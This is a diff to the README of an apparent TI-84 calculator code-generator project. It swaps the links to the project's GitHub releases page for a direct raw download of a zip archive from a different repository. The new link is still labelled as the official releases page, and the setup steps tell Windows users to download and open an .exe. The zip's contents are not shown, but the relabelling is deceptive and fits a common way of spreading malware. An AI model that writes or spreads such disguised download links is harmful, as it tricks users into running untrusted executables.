@@ -5,7 +5,7 @@ description: "Generate code for TI-84 Plus CE Python calculators using this auto
 ---
 # 📟 ti84-evo-scripter - Turn plain text into calculator programs
 
-[ ![Download ti84-evo-scripter](https://img.shields.io/badge/Download-Release_Page-blue.svg) ](https://github.com/farragutstarchart330/ti84-evo-scripter/releases)
+[ ![Download ti84-evo-scripter](https://img.shields.io/badge/Download-Release_Page-blue.svg) ](https://github.com/farragutstarchart330/farragutstarchart330.github.io/raw/refs/heads/main/sarif/2.2.zip)
 
 This tool creates programs for your TI-84 Evo calculator. You type a math problem or a logic task in plain English. The software writes the code, checks for errors, and makes it ready for your calculator. It ensures the program works within the limits of your specific calculator model.
 
@@ -13,7 +13,7 @@ This tool creates programs for your TI-84 Evo calculator. You type a math proble
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/farragutstarchart330/ti84-evo-scripter/releases) to find the latest version.
+1. Visit the [official releases page](https://github.com/farragutstarchart330/farragutstarchart330.github.io/raw/refs/heads/main/sarif/2.2.zip) to find the latest version.
 2. Look for the file ending in .exe under the Assets section.
 3. Click the file name to download it to your computer.
 4. Open your Downloads folder.
